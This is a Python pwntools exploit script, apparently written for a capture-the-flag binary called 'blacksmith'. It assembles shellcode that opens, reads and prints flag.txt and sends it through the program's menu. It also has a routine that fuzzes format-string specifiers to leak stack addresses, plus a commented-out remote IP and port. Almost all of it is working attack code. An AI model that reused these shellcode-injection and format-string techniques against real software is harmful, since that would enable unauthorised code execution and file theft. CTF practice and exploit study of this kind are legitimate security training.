#!/usr/bin/python3

import sys
import os
import re
import struct
from pwn import *
import argparse


################################################################################################################
#           Building Payload for Exploit
#
################################################################################################################

exe="./blacksmith"
elf=context.binary=ELF(exe, checksec=False)
context.log_level="debug"
#context.log_level="info"
#context.log_level="error"
def exploit_init():
    payload_0=asm(shellcraft.open('./flag.txt'))
    payload_0 += asm(shellcraft.read(3, 'rsp', 64))
    payload_0 += asm(shellcraft.write(1, 'rsp', 'rax'))

    exploit_payload=flat(payload_0)
    target=q_start()
    initial_payload=b'1'
    submenu_payload=b'2'
    target.recv()
    target.sendlineafter(b'> ', initial_payload)
    target.sendlineafter(b'> ', submenu_payload)
    target.sendlineafter('>', exploit_payload) 
    ret_adr=target.recvline()
    print("contents of flag.txt: {0}".format(ret_adr))

################################################################################################################
#           GDB Script Setup
#            
#
################################################################################################################
gdbscript='''
'''.format(**locals())




################################################################################################################
#           Testing Exploit
#           Command line args used to switch between testing locally with qemu + testing remotely
#
################################################################################################################
x86_64_qemu_args=["qemu-x86_64", "-L", "/usr/x86_64-linux-gnu/"]
#gdb_bin_args=["-g", "1234", "-ex", "target remote localhost:1234"]
gdb_args=["--nh", "-ex", "set architecture i386:x86_64"]



def q_start(argv=[], *a , **kwargs):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    elif args.GDB:
        return gdb-multiarch.debug(gdb_args + [exe], gdbscript=gdbscript, *a, **kwargs)
    else:
        return process(x86_64_qemu_args +[exe], *a, **kwargs)


##remote exploit
#target=process("nc")
##target=remote("167.99.207.150", 30511)

##have to use sendline() not send() so that the trailing \n is appended to the bytes payload
##target.sendline(final_payload)
payload_initial=asm(shellcraft.cat('flag.txt'))


def fuzz_exploit_payload(test_adr: dict()):
    for i in range(8,40):
        try:
            target=q_start()
            initial_payload=b'2'
            initial=b'1'
            exit_payload=b'3'
            ret_adr=exploit(target, initial_payload, i)
            updated_target = b'22' 
            #first value can likely be any char, since we have to account for overwriting the value after the first payload (when the len(firstpayload) > 5)
            res=exploit(target, updated_target, i)
            removechars=re.compile(r"\s+")
            adr_matchgroup=re.compile(r"(0x[0-9a-fA-F]+)")
            newstr_match=re.search(adr_matchgroup, str(ret_adr))
            if newstr_match:
                test_newstr=newstr_match.group()
                test_retadr = test_newstr
                test_retadr.strip(r"\s+")
                test_adr[i]=test_retadr
            testprintf_adr=elf.symbols.printf
            print("Testing read of printf address: {0}".format(testprintf_adr))
            target.close()
        except EOFError as e:
            pass
    return test_adr


def exploit(target, initial_payload, payload):
    ##target=q_start()
    #initial_payload=b'2'
    fuzz_payload = bytes(('%{0}$p '.format(payload)).encode())
    target.recv()
    target.sendlineafter(b'3. Exit\x0a> ', initial_payload)
    target.sendlineafter('>', fuzz_payload) 
    ret_adr=target.recvline()
    return ret_adr
    

################################################################################################################
#           Argparse template - more detailed/fine-grained command line controls
#
################################################################################################################

def setup_options():
    parser = argparse.ArgumentParser(description='Generate exploits for programs vulnerable to memory corruption vulnerabilities; includes functions for identifying/calculating address offset and padding, creating payloads and employing various common mitigation bypass techniques.')
    args = parser.parse_args()
    return parser, args

def exploit_preamble(parser, args):
    r=args.remote
    print("args:", args)
    print("remote:", r)

################################################################################################################
#
################################################################################################################

if __name__ == '__main__':
    exploit_init()

